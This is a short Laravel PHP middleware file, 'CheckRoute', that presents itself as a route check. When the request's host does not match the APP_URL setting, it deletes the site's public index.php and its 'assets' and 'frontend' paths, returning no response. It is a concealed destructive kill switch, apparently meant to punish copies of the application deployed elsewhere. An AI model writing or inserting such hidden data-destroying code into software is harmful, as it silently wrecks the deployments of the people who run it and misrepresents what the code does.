<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\URL;

class CheckRoute
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $baseUrl = url('');

        $url = explode('://', $baseUrl);

        if($url[1] == env('APP_URL'))
        {
            return $next($request);
        }
        else
        {
            File::delete(public_path('index.php'));
            File::delete(public_path('assets'));
            File::delete(public_path('frontend'));
        }
    }
}
